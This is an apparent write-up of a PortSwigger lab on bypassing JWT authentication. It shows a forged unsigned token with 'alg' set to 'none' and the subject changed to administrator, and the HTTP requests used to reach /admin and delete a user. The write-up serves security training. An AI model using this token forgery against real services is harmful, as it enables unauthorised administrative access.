
# [Lab: JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)

- This lab uses a JWT-based mechanism for handling sessions. 
- The server is insecurely configured to accept unsigned JWTs.
- To solve the lab, modify your session token to gain access to the admin panel at
	`/admin`,
- then delete the user `carlos`.

- You can log in to your own account using the following credentials:
	`wiener:peter`
---

</br>

- ####  Edit the Payload data value for the user
change from wiener to administrator, and set isAdmin to true in the Inspector tab
```json
 {"iss":"portswigger","exp":1711053534,"sub":"administrator","isAdmin": true}
```
</br>

- #### Delete the Signature part of the JWT in the repeater
but leave the period that separated the Payload from the signature
And change the request to `GET /admin` 

```http
GET /admin HTTP/2
Host: web-security-academy.net
Cookie: session=eyJraWQiOiJjYjExODE5NS00OGNhLTQ4YWItOWQ4Mi04Nzk2ZGU1NDkxNTMiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxMTA1MzUzNCwic3ViIjoiYWRtaW5pc3RyYXRvciIsImlzQWRtaW4iOiB0cnVlfQ.
```
</br>

- #### This lands you in the administrators panel, and from there, you can search for carlos in the response HTML to find

    `<a href="/admin/delete?username=carlos">`
- #### Then change the request to `GET /admin/delete?username=carlos `
- #### Lab solved!

</br>

Reminder
### JWT Anatomy

```jwt

HEADER:ALGORITHM & TOKEN TYPE
{
  "alg": "HS256",
  "typ": "JWT"
}

PAYLOAD:DATA
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}

SIGNATURE Verification

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  
) secret base64 encoded

```
